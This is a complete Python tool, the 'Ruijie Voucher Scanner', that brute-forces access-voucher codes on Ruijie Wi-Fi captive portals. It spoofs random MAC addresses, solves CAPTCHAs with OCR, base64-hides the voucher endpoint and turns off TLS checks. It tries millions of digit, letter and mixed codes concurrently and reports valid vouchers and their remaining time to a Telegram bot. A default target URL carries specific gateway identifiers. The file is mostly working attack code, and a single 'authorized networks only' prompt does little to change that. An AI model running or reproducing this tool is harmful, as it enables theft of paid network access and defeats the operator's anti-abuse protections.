
#!/usr/bin/env python3
# ==============================================
#  Ruijie Voucher Scanner  —  v7.1 (Render Edition)
#  - Environment variables for tokens
#  - Telegram notifications
#  - Real-time stats (Speed, Tried, Hits)
# ==============================================

import requests
import threading
import time
import sys
import os
import asyncio
import aiohttp
import base64
import random
import re
import string
import json
from datetime import datetime
import ssl
import urllib3

try:
    import cv2
    import ddddocr
    import numpy as np
    _HAS_OCR = True
except ImportError:
    _HAS_OCR = False

# ==================== SSL & WARNING BYPASS ====================
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================
#  COLORS -- Neon terminal palette
# =============================================
class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    GRAY    = "\033[90m"

def cprint(text, color=C.WHITE, bold=False, end="\n"):
    b = C.BOLD if bold else ""
    print(f"{b}{color}{text}{C.RESET}", end=end)

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    clear_screen()
    print(f"""
{C.CYAN}╔══════════════════════════════════════════════════════════════════╗
    🔥 RUIJIE VOUCHER SCANNER - RENDER EDITION                
    ⚡ 6,7,8,9 Digit | Lower | Mixed                  
    👤 @ArrowDemon2006                   
╚══════════════════════════════════════════════════════════════════╝{C.RESET}
    """)

# ========== CONFIGURATION (from Environment Variables) ==========
TARGET_URL = os.getenv("TARGET_URL", "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C")
THREADS = int(os.getenv("THREADS", "50"))
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
FOUND_FILE = "found_voucher.txt"
RESULT_FILE = os.path.expanduser("~/scan_results.txt")

# =============================================
#  TELEGRAM
# =============================================
def send_telegram(message):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message}, timeout=3)
    except:
        pass

# =============================================
#  ENGINE
# =============================================
_connector = None
_voucher_sem = None
_ocr = None
stop_flag = False
found_codes = []
limited_codes = []
retry_total = 0
tried = 0
hits = []
lock = threading.Lock()
start_time = None

def get_mac():
    b = random.choice([0x02, 0x06, 0x0A, 0x0E])
    return ":".join(f"{x:02x}" for x in ([b] + [random.randint(0, 255) for _ in range(5)]))

def replace_mac(url, new_mac):
    return re.sub(r'(?<=mac=)[^&]+', new_mac, url)

def _init_ocr():
    global _ocr
    if _ocr is None and _HAS_OCR:
        try:
            _ocr = ddddocr.DdddOcr(show_ad=False)
        except:
            _ocr = None
    return _ocr

def _ocr_sync(image_bytes):
    ocr = _init_ocr()
    if ocr is None:
        return None
    nparr = np.frombuffer(image_bytes, np.uint8)
    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buf = cv2.imencode('.png', th)
    return ocr.classification(buf.tobytes()).upper()

async def get_session_id(sess, session_url, previous=None):
    url = replace_mac(session_url, get_mac())
    headers = {
        'accept': 'text/html,*/*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36',
        'upgrade-insecure-requests': '1',
    }
    try:
        async with sess.get(url, headers=headers, allow_redirects=True, ssl=False) as r:
            sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return sid.group(1) if sid else previous
    except:
        return previous

async def Captcha_Image(sess, session_id):
    headers = {
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
    }
    async with sess.get(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
        params={'sessionId': session_id, '_t': str(time.time())},
        headers=headers, ssl=False
    ) as r:
        return await r.read()

async def Captcha_Text(img_bytes):
    return await asyncio.to_thread(_ocr_sync, img_bytes)

async def Varify_Captcha(sess, session_id, text):
    headers = {'content-type': 'application/json'}
    async with sess.post(
        'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
        headers=headers, json={'sessionId': session_id, 'authCode': text}, ssl=False
    ) as r:
        d = await r.json()
        return session_id if d.get("success") is True else None

async def Code_Expires_Date(session_id):
    endpoints = [
        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{session_id}',
        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{session_id}',
    ]
    headers = {'accept': 'application/json', 'user-agent': 'Mozilla/5.0'}
    for url in endpoints:
        try:
            async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as s:
                async with s.get(url, headers=headers, ssl=False) as r:
                    data = await r.json()
                    res = data.get('result', {})
                    plan = res.get('profileName', 'Unknown')
                    remaining = res.get('remainingMinutes') or res.get('totalMinutes')
                    if remaining is not None:
                        hh, mm = divmod(int(remaining), 60)
                        return f"Plan: {plan} | Time: {hh}h {mm}m"
        except:
            continue
    return "Plan:Unknown | Time:Unknown"

_post_url = base64.b64decode(
    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
).decode()

async def perform_check(session_url, code):
    global retry_total, tried, hits
    for attempt in range(3):
        async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=30)) as sess:
            session_id = await get_session_id(sess, session_url)
            if not session_id:
                return
            auth_code = None
            if _HAS_OCR:
                for _ in range(8):
                    img = await Captcha_Image(sess, session_id)
                    text = await Captcha_Text(img)
                    if not text:
                        continue
                    if await Varify_Captcha(sess, session_id, text):
                        auth_code = text
                        break
            if not auth_code:
                return
            if stop_flag:
                return
            payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
            try:
                async with sess.post(_post_url, json=payload, headers=headers, ssl=False) as r:
                    response = await r.text()
            except:
                return
        if 'request limited' in response:
            retry_total += 1
            await asyncio.sleep(0.5)
            continue
        break
    else:
        return
    with lock:
        tried += 1
    if 'logonUrl' in response:
        info = await Code_Expires_Date(session_id)
        found_codes.append(f"{code} | {info}")
        with lock:
            hits.append(code)
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[SUCCESS] {code}  |  {info}\n")
        send_telegram(f"✅ Voucher found: {code}\n{info}\nURL: {session_url}")
        cprint(f"\n[+] SUCCESS CODE: {code} | {info}", C.GREEN)
    elif 'STA' in response:
        info = await Code_Expires_Date(session_id)
        limited_codes.append(f"{code} | {info}")
        with open(RESULT_FILE, "a", encoding="utf-8") as f:
            f.write(f"[LIMITED] {code}  |  {info}\n")
        send_telegram(f"⚠️ LIMITED CODE: {code}\n{info}")
        cprint(f"\n[-] LIMITED CODE: {code} | {info}", C.YELLOW)

def iter_range_codes(start, end):
    digits = max(len(str(start)), len(str(end)))
    codes = [str(i).zfill(digits) for i in range(start, end + 1)]
    random.shuffle(codes)
    for c in codes:
        yield c

def iter_random_codes(length, count=None):
    i = 0
    while count is None or i < count:
        yield "".join(random.choice(string.digits) for _ in range(length))
        i += 1

def iter_letter_codes(length, count=None):
    i = 0
    while count is None or i < count:
        yield "".join(random.choice(string.ascii_lowercase) for _ in range(length))
        i += 1

def iter_mixed_codes(length, count=None):
    pool = string.ascii_lowercase + string.digits
    i = 0
    while count is None or i < count:
        yield "".join(random.choice(pool) for _ in range(length))
        i += 1

def stats_printer():
    while not stop_flag:
        time.sleep(1)
        elapsed = time.time() - start_time
        speed = tried / elapsed if elapsed > 0 else 0
        sys.stdout.write(f"\r\U0001F552 SPEED: {speed:.1f} c/s | TRIED: {tried} | HITS: {len(hits)}")
        sys.stdout.flush()
    print()

async def run_scan(session_url, start_code, end_code, workers, code_list=None):
    global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time
    _init_ocr()
    tried = 0
    hits = []
    found_codes = []
    limited_codes = []
    retry_total = 0
    stop_flag = False
    _connector = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    _voucher_sem = asyncio.Semaphore(workers)
    if code_list:
        all_codes = code_list
        total = len(all_codes)
        code_iter = iter(all_codes)
    else:
        digits = max(len(str(start_code)), len(str(end_code)))
        total = end_code - start_code + 1
        code_iter = iter_range_codes(start_code, end_code)
    cprint(f"\n  [+] Mode: Digit-only ({digits}-digit)", C.CYAN, bold=True)
    cprint(f"  [+] Range: {str(start_code).zfill(digits)} -> {str(end_code).zfill(digits)} ({total:,} codes)", C.YELLOW)
    cprint(f"  [+] Workers: {workers}\n", C.GREEN)
    start_time = time.time()
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()
    checked = 0
    try:
        while not stop_flag:
            batch = []
            for _ in range(500):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c)
            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)
    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        await _connector.close()
    elapsed = time.time() - start_time
    cprint(f"\n  [+] Completed in {elapsed:.2f} seconds", C.GREEN, bold=True)
    cprint(f"      Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)}", C.CYAN)
    if hits:
        cprint(f"  [+] Voucher found: {hits[0]}", C.GREEN, bold=True)
        with open(FOUND_FILE, "w") as f:
            f.write(f"{hits[0]}\n")
        if found_codes:
            cprint("  [+] All success codes:", C.YELLOW)
            for c in found_codes:
                cprint(f"      {c}", C.GREEN)
    else:
        cprint("  [-] No valid voucher found.", C.RED)
        send_telegram(f"Scan finished on {session_url}\nTried {tried} codes, no hits.")

def main():
    global stop_flag
    clear_screen()
    print_banner()
    cprint("  ── TARGET URL ──────────────────────────────", C.BLUE, bold=True)
    cprint(f"  Default: {TARGET_URL[:60]}...", C.GRAY)
    use_default = input(f"  {C.CYAN}[?] Use default URL? (y/n): {C.RESET}").strip().lower()
    if use_default == "y" or use_default == "":
        session_url = TARGET_URL
    else:
        session_url = input(f"  {C.CYAN}[?] Enter Session URL: {C.RESET}").strip()
        if not session_url:
            cprint("  [-] No URL provided. Using default.", C.RED)
            session_url = TARGET_URL
    cprint(f"  [+] Target set.", C.GREEN)
    print()
    # Mode selection
    cprint("  🔢 Select Scan Mode:", C.CYAN, bold=True)
    print("  1. 6-digit (000000-999999)")
    print("  2. 7-digit (0000000-9999999)")
    print("  3. 8-digit (00000000-99999999)")
    print("  4. 9-digit (000000000-999999999)")
    print("  5. 6-letter (a-z)")
    print("  6. 7-letter (a-z)")
    print("  7. 8-letter (a-z)")
    print("  8. Mixed 6 (a-z+0-9)")
    print("  9. Mixed 7 (a-z+0-9)")
    print("  10. Mixed 8 (a-z+0-9)")
    choice = input(f"  {C.CYAN}[💬] Select mode (1-10): {C.RESET}").strip()
    if choice == "1":
        mode_type = "digit"
        start_code, end_code = 0, 999999
    elif choice == "2":
        mode_type = "digit"
        start_code, end_code = 0, 9999999
    elif choice == "3":
        mode_type = "digit"
        start_code, end_code = 0, 99999999
    elif choice == "4":
        mode_type = "digit"
        start_code, end_code = 0, 999999999
    elif choice == "5":
        mode_type = "letter"
        length = 6
    elif choice == "6":
        mode_type = "letter"
        length = 7
    elif choice == "7":
        mode_type = "letter"
        length = 8
    elif choice == "8":
        mode_type = "mixed"
        length = 6
    elif choice == "9":
        mode_type = "mixed"
        length = 7
    elif choice == "10":
        mode_type = "mixed"
        length = 8
    else:
        cprint("  [-] Invalid choice. Using 6-digit default.", C.RED)
        mode_type = "digit"
        start_code, end_code = 0, 999999
    print()
    workers_inp = input(f"  {C.CYAN}[?] Workers (default {THREADS}): {C.RESET}").strip()
    workers = int(workers_inp) if workers_inp else THREADS
    print()
    cprint("  [!!] Use only on authorized networks!", C.RED, bold=True)
    confirm = input(f"  {C.YELLOW}[?] Type 'yes' to start: {C.RESET}").strip().lower()
    if confirm != "yes":
        cprint("  [-] Aborted.", C.RED)
        sys.exit(0)
    if mode_type in ("letter", "mixed"):
        asyncio.run(_run_random_scan(session_url, length, workers, mode_type))
    else:
        asyncio.run(run_scan(session_url, start_code, end_code, workers))

async def _run_random_scan(session_url, length, workers, mode_type="digit"):
    global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time
    _init_ocr()
    tried = 0
    hits = []
    found_codes = []
    limited_codes = []
    retry_total = 0
    stop_flag = False
    _connector = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
    _voucher_sem = asyncio.Semaphore(workers)
    if mode_type == "letter":
        code_iter = iter_letter_codes(length)
        mode_label = f"Letter-only ({length}-char a-z)"
    elif mode_type == "mixed":
        code_iter = iter_mixed_codes(length)
        mode_label = f"Mixed ({length}-char a-z+0-9)"
    else:
        code_iter = iter_random_codes(length)
        mode_label = f"Digit-only ({length}-digit)"
    cprint(f"\n  [+] Mode: {mode_label}", C.CYAN, bold=True)
    cprint(f"  [+] Workers: {workers} | Infinite random scan\n", C.YELLOW)
    start_time = time.time()
    stats_thread = threading.Thread(target=stats_printer, daemon=True)
    stats_thread.start()
    checked = 0
    try:
        while not stop_flag:
            batch = []
            for _ in range(500):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break
            async def _check(c):
                async with _voucher_sem:
                    await perform_check(session_url, c)
            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)
    except (asyncio.CancelledError, KeyboardInterrupt):
        stop_flag = True
    finally:
        await _connector.close()
    elapsed = time.time() - start_time
    cprint(f"\n  [+] Completed in {elapsed:.2f} seconds", C.GREEN, bold=True)
    cprint(f"      Checked: {checked} | Found: {len(found_codes)} | Limited: {len(limited_codes)}", C.CYAN)
    if hits:
        cprint(f"  [+] Voucher found: {hits[0]}", C.GREEN, bold=True)
        with open(FOUND_FILE, "w") as f:
            f.write(f"{hits[0]}\n")
    else:
        cprint("  [-] No valid voucher found.", C.RED)
        send_telegram(f"Scan finished\nTried {tried} codes, no hits.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n  [!!] Interrupted by user.", C.YELLOW)
        sys.exit(0)
